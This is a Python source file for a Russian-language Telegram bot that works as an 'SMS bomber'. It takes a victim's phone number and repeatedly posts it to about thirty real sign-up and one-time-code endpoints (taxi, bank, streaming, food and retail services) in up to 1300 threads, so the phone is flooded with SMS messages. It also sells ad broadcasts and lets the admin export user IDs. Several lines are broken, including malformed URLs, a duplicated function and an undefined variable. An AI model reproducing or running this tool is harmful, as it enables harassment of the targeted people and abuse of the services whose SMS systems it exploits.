import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import os
import random
import string

TOKEN = "Тут свой токен"

THREADS_LIMIT = 1300

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 465305744

group_id = -1001376697243

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []


def send_message_users(message):
    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f"сообщение успешно отправлено всем ({users_amount[0]}) пользователям бота!")


def send_message_users(message):
    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }

        response = requests.post(
            'https://api.telegram.org/bot' + TOKEN + '/sendMessage (https://api.telegram.org/bot' + TOKEN + '/sendMessage)',
            data=data)
        res = str(response.json)
        print(res)
        if res == '<bound method Response.json of <Response [403]>>':
            with open(chat_ids_file, "r") as f:
                lines = f.readlines()
            with open(chat_ids_file, "w") as f:
                for line in lines:
                    if line.strip("\n") != chat_id:
                        f.write(line)
        else:
            pass

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f'Сообщение всем ({users_amount[0]}) пользователям бота успешно дошло!')


def posts(message):
    f = open("friend.txt", mode="w", encoding="utf-8")
    f.write(message.text)
    f.close()
    bot.send_message(message.chat.id, "Описание партнера успешно обновлено")


def subchan(message):
    f = open('url.txt', mode='w', encoding='utf-8')
    f.write(message.text)
    f.close()
    bot.send_message(message.chat.id, 'Ссылка обновлена')


def postsRES():
    f = open("friend.txt", mode="w", encoding="utf-8")
    f.write("""
     Реклама - 🤝Наш партнёр
  24 часа (1 день) + 1 рассылка - 200₽
  48 часов (2 дня) + 1 рассылка - 250₽
  120 часов (5 дней) + 1 рассылка - 400₽
  Ваш текст будет во вкладке 🤝Наш партнёр""")
    f.close()


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='🔥💣БОМБЕР')
    stop = types.KeyboardButton(text='⛔️STOP')
    info = types.KeyboardButton(text='ℹ️Информация')
    stats = types.KeyboardButton(text='📈Статистика')
    donat = types.KeyboardButton(text='💰Поддержать')
    piar = types.KeyboardButton(text='💸 Реклама')
    spons = types.KeyboardButton(text='🤝Наш партнер')

    buttons_to_add = [boom, stop, info, stats, donat, piar, spons]

    keyboard.add(*buttons_to_add)

    some_var = bot.get_chat_member(group_id, message.chat.id)
    user_status = some_var.status

    url = open('url.txt', 'r')

    global inl_keyboard
    inl_keyboard = types.InlineKeyboardMarkup()
    s = types.InlineKeyboardButton(text='Подписаться', url=url.read())
    inl_keyboard.add(s)
    # print(some_var)
    # print(user_status)
    if user_status == 'member' or user_status == 'administrator' or user_status == 'creator':
        bot.send_message(message.chat.id, 'Добро пожаловать🙋‍♂!\nВыберите действие:', reply_markup=keyboard)
        save_chat_id(message.chat.id)

    if user_status == 'restricted' or user_status == 'left' or user_status == 'kicked':
        bot.send_message(message.chat.id,
                         'Вы не подписаны на наш канал.\nПодпишитесь на него чтобы получить доступ к боту.',
                         reply_markup=inl_keyboard)


def send_for_number(phone):
    while True:
        request_timeout = 0.0000002
        phone1 = '+' + phone[0] + ' ' + '(' + phone[1] + phone[2] + phone[3] + ')' + " " + phone[4] + phone[5] + phone[
            6] + '-' + phone[7] + phone[8] + '-' + phone[9] + phone[10]
        phone2 = phone[1] + phone[2] + phone[3] + phone[4] + phone[5] + phone[6] + phone[7] + phone[8] + phone[9] + \
                 phone[10]

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': phone})
        except Exception as e:
            pass

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone})
        except Exception as e:
            pass

        try:
            requests.post("https://api.mtstv.ru/v1/users", data={'msisdn': phone})
        except Exception as e:
            pass

        try:
            a = requests.get('https://driver.gett.ru/signup/')
            requests.post('https://driver.gett.ru/api/login/phone/', data={'phone': phone, 'registration': 'true'},
                          headers={'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.5',
                                   'Connection': 'keep-alive', 'Cookie': 'csrftoken=' + a.cookies[
                                  'csrftoken'] + '; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2',
                                   'Host': 'driver.gett.ru (http://driver.gett.ru/)',
                                   'Referer': 'https://driver.gett.ru/signup/',
                                   'User-Agent': 'Mozilla/5.0 (https://driver.gett.ru/signup/',
                                   'User-Agent': 'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',
                                   'X-CSRFToken': a.cookies['csrftoken']})
        except Exception as e:
            pass

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data={"phone": phone},
                          headers={'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive',
                                   'Host': 'api.ivi.ru (http://api.ivi.ru/)', 'origin': 'https://www.ivi.ru/',
                                   'Referer': 'https://www.ivi.ru/profile (https://www.ivi.ru/',
                                   'Referer': 'https://www.ivi.ru/profile)'})
        except:
            pass

        try:
            b = requests.session()
            b.get('https://drugvokrug.ru/siteActions/processSms.htm')
            requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': phone},
                          headers={'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive',
                                   'Cookie': 'JSESSIONID=' + b.cookies['JSESSIONID'] + ';',
                                   'Host': 'drugvokrug.ru (http://drugvokrug.ru/)', 'Referer': 'https://drugvokrug.ru/',
                                   'User-Agent': 'Mozilla/5.0 (https://drugvokrug.ru/',
                                   'User-Agent': 'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',
                                   'X-Requested-With': 'XMLHttpRequest'})
        except Exception as e:
            pass

        # Добавленые сервисы
        try:
            rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone[1:]})
        except Exception as e:
            pass

        try:
            rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + phone})
        except Exception as e:
            pass

        try:
            psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                                   json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов',
                                         'sex': '1', 'birthDate': '10.10.2000', 'mobilePhone': phone[1:],
                                         'russianFederationResident': 'true', 'isDSA': 'false',
                                         'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                                         'promotionAgreement': 'true'})
        except Exception as e:
            pass

        try:
            beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',
                                       data={'phone': phone})
        except Exception as e:
            pass

        try:
            modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone',
                                      json={'FirstName': 'Саша', 'CellPhone': phone[1:], 'Package': 'optimal'})
        except Exception as e:
            pass

        try:
            data = {

                'form[NAME]': 'Иван',
                'form[PERSONAL_GENDER]': 'M',
                'form[PERSONAL_BIRTHDAY]': '11.02.2000',
                'form[EMAIL]': 'fbhbdfvbd@gmail.com',
                'form[LOGIN]': phone1,
                'form[PASSWORD]': None,
                'get-new-password': 'Получите пароль по SMS',
                'user_agreement': 'on',
                'personal_data_agreement': 'on',
                'formType': 'full',
                'utc_offset': 180
            }
            aptkru = requests.post('https://apteka.ru/_action/auth/getForm/', data=data)
        except Exception as e:
            pass

        try:
            tvzavr = requests.post(
                'https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone=' + phone + '&csrf_value=a222ba2a464543f5ac6ad097b1e92a49 (https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone=%27+phone+%27&csrf_value=a222ba2a464543f5ac6ad097b1e92a49)')
        except Exception as e:
            pass

        try:
            cook = requests.post('https://www.netprint.ru/order/profile')

            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Content-Length': 145,
                'Cookie': 'unbi=' + cook.cookies['unbi'],
                'Host': 'www.netprint.ru',
                'Origin': 'https://www.netprint.ru',
                'Referer': 'https://www.netprint.ru/order/profile',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48',
                'X-Requested-With': 'XMLHttpRequest'
            }

            netprint = requests.post('https://www.netprint.ru/order/social-auth', headers=headers,
                                     data={'operation': 'stdreg', 'email_or_phone': phonew, 'i_agree_with_terms': 1})
        except Exception as e:
            pass

        try:
            requests.post('http://youdrive.today/login/web/phone', data={'phone': phone, 'phone_code': 7})
        except Exception as e:
            pass

        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone + '&country_code=%2B7&nod=4&locale=en')
        except Exception as e:
            pass

        try:
            requests.post("https://api.carsmile.com/",
                          json={"operationName": "enterPhone", "variables": {"phone": phone},
                                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        except Exception as e:
            pass

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
        except Exception as e:
            pass

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru',
                                'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        except Exception as e:
            pass

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + phone,
                                "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6",
                                "osversion": "unknown", "devicemodel": "unknown"})
        except Exception as e:
            pass

        try:
            password = ''.join(random.choice(string.ascii_letters) for _ in range(6))
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + phone})
        except Exception as e:
            pass

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',
                          json={"phone": phone})
        except Exception as e:
            pass

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
        except Exception as e:
            pass

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
        except Exception as e:
            pass

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + phone, "api": 2, "email": "email",
                                "x-email": "x-email"})
        except Exception as e:
            pass

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + phone})
        except Exception as e:
            pass

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                          json={"phone": phone})
        except Exception as e:
            pass

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",
                          json={"phone": phone, "type": 2})
        except Exception as e:
            pass

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + phone})
        except Exception as e:
            pass

        try:
            topPHONE = '+' + phone[0] + '(' + phone[1] + phone[2] + phone[3] + ')' + phone[4] + phone[5] + phone[
                6] + '-' + phone[7] + phone[8] + '-' + phone[9] + phone[10]
            topshop = requests.post('https://www.top-shop.ru/login/loginByPhone/', data={'phone': topPHONE})
        except Exception as e:
            pass


def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    if force:
        msg = 'Спам запущен на неограниченое время для номера +' + phone_number
    else:
        msg = 'Спам запущен на 10 минут на номер +' + phone_number

    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes=10)
    while (datetime.now() < end) or (force and chat_id == ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, 'Спам на номер +' + phone_number + ' завершён')
    THREADS_AMOUNT[0] -= 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass


def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id,
                         'Вы уже начали рассылку спама. Дождитесь окончания или нажмите STOP и поробуйте снова')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут')
        print('Максимальное количество тредов исполняется. Действие отменено.')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='🔥💣БОМБЕР')
    stop = types.KeyboardButton(text='⛔️STOP')
    info = types.KeyboardButton(text='ℹ️Информация')
    stats = types.KeyboardButton(text='📈Статистика')
    donat = types.KeyboardButton(text='💰Поддержать')
    piar = types.KeyboardButton(text='💸 Реклама')
    spons = types.KeyboardButton(text='🤝Наш партнер')

    buttons_to_add = [boom, stop, info, stats, donat, piar, spons]

    keyboard.add(*buttons_to_add)

    some_var = bot.get_chat_member(group_id, message.chat.id)
    user_status = some_var.status

    url = open('url.txt', 'r')
    inl_keyboard = types.InlineKeyboardMarkup()
    s = types.InlineKeyboardButton(text='Подписаться', url=url.read())
    inl_keyboard.add(s)

    adm = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    a = types.KeyboardButton(text='Рассылка')
    b = types.KeyboardButton(text='Предложить рекламу')
    c = types.KeyboardButton(text='Добавить партнер')
    d = types.KeyboardButton(text='Удалить партнера')
    vpn = types.KeyboardButton(text='Обновить VPN')
    sub = types.KeyboardButton(text='Изменить ссылку на канал')
    file = types.KeyboardButton(text='Dump DB')
    e = types.KeyboardButton(text='Назад')
    adm.add(a, b, c, d, vpn, sub, file, e)

    chat_id = int(message.chat.id)
    text = message.text

    some_var = bot.get_chat_member(group_id, message.chat.id)
    user_status = some_var.status

    if user_status == 'member' or user_status == 'administrator' or user_status == 'creator':

        if text == "Добавить партнер" and chat_id == ADMIN_CHAT_ID:
            a = bot.send_message(message.chat.id, "Пришлите рекламу вашего партнера:")
            bot.register_next_step_handler(a, posts)

        elif text == 'Изменить ссылку на канал' and chat_id == ADMIN_CHAT_ID:
            b = bot.send_message(message.chat.id, 'Введите ссылку на канал')
            bot.register_next_step_handler(b, subchan)

        elif text == 'Удалить партнера' and chat_id == ADMIN_CHAT_ID:
            postsRES()
            bot.send_message(chat_id, 'Партнер удалён')

        elif text == 'ℹ️Информация':
            bot.send_message(chat_id,
                             'Владелец бота: @tg_mysecure \nПо вопросам сотрудничества обращаться в ЛС сюда @tg_mysecure \nБот работает пока что только на Россию и Украину')

        elif text == '🔥💣БОМБЕР':
            bot.send_message(chat_id, 'Введите номер в формате:\n🇷🇺 79xxxxxxxxx\n🇺🇦 380xxxxxxxxx')

        elif text == '📈Статистика':
            with open('chat_ids.txt') as f:
                size = sum(1 for _ in f)
            bot.send_message(chat_id, '📊Статистика отображается в реальном времени📡!\nПользователей🙎‍♂: ' + str(
                size) + '\nСервисов для RU🇷🇺: 30\nСервисов для UK🇺🇦: 30\nБот запущен: 29.08.2019')

        elif text == '💰Поддержать':
            bot.send_message(chat_id,
                             'Ребята, кто может материально помочь на развитие бота\nВот реквизиты\nQIWI карта: ' + '<pre>999999999999999</pre>',
                             parse_mode="HTML")

        elif text == '💸 Реклама':
            bot.send_message(chat_id, """
 Реклама - рассылка:
 Цена: 150₽
 Каждый пользователь получит уведомление с вашим текстом.

 Реклама - 🤝Наш партнёр
 24 часа (1 день) + 1 рассылка - 250₽
 48 часов (2 дня) + 1 рассылка - 300₽
 120 часов (5 дней) + 1 рассылка - 500₽
 Ваш текст будет во вкладке 🤝Наш партнёр

 Купить: @tg_mysecure  """)

        elif text == '/admin' and chat_id == ADMIN_CHAT_ID:
            bot.send_message(chat_id, 'Выберите действие.', reply_markup=adm)

        elif text == 'Назад' and chat_id == ADMIN_CHAT_ID:
            bot.send_message(chat_id, 'Выберите действие.', reply_markup=keyboard)

        elif text == 'Рассылка' and chat_id == ADMIN_CHAT_ID:
            bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

        elif text == 'Обновить VPN' and chat_id == ADMIN_CHAT_ID:
            bot.send_message(chat_id, 'Бот перезапускается...')
            os.system('python3 start.py')

        elif text == 'Dump DB' and chat_id == ADMIN_CHAT_ID:
            f = open('chat_ids.txt')
            bot.send_document(chat_id, f)

        elif text == '🤝Наш партнер':
            post = ""
            f = open("friend.txt", mode="r", encoding="utf-8")
            for line in f.readlines():
                post += line
            bot.send_message(message.chat.id, post)
            f.close()



        elif text == 'Предложить рекламу' and chat_id == ADMIN_CHAT_ID:
            bot.send_message(message.chat.id, 'Рассылка начелась')
            predlog = '✅Не знаете где дать рекламу качественно и не дорого?\n🏛Тогда вы по адресу!!!\n\n👥 У нас вашу рекламу увидят все пользователи бота\n📨 @spamm3r_bot\n\n🗣 Каждый пользователь получит сообщение от бота с вашей рекламой!\n☀️ ' + str(
                users_amount[
                    0]) + ' ☀️ активных пользователей!\n\n💶 Цена рассылки: 150 ₽\n\nРеклама - 🤝Наш партнёр\n24 часа (1 день) + 1 рассылка - 250₽\n48 часов (2 дня) + 1 рассылка - 300₽\n120 часов (5 дней) + 1 рассылка - 500₽\nВаш текст будет во вкладке 🤝Наш партнёр\n\nКупить: @tg_mysecure '
            send_message_users(predlog)
            bot.send_message(chat_id, 'Рассылка завершена')

        elif text == '⛔️STOP':
            if chat_id not in running_spams_per_chat_id:
                bot.send_message(chat_id, 'Вы еще не начинали спам')
            else:
                running_spams_per_chat_id.remove(chat_id)

        elif 'РАЗОСЛАТЬ: ' in text and chat_id == ADMIN_CHAT_ID:
            msg = text.replace("РАЗОСЛАТЬ: ", "")
            bot.send_message(message.chat.id, 'Рассылка начелась')
            send_message_users(msg)
            bot.send_message(chat_id, 'Рассылка завершена')




        elif len(text) == 11:
            phone = text
            spam_handler(phone, chat_id, force=False)

        elif len(text) == 12:
            phone = text
            spam_handler(phone, chat_id, force=False)


        elif len(text) == 12 and chat_id == ADMIN_CHAT_ID and text[0] == '_':
            phone = text[1:]
            spam_handler(phone, chat_id, force=True)

        else:
            bot.send_message(chat_id, 'Номер введен неправильно.')

    if user_status == 'restricted' or user_status == 'left' or user_status == 'kicked':
        bot.send_message(message.chat.id,
                         'Вы не подписаны на наш канал.\nПодпишитесь на него, чтобы получить доступ к боту.',
                         reply_markup=inl_keyboard)


bot.polling(none_stop=True, interval=0)
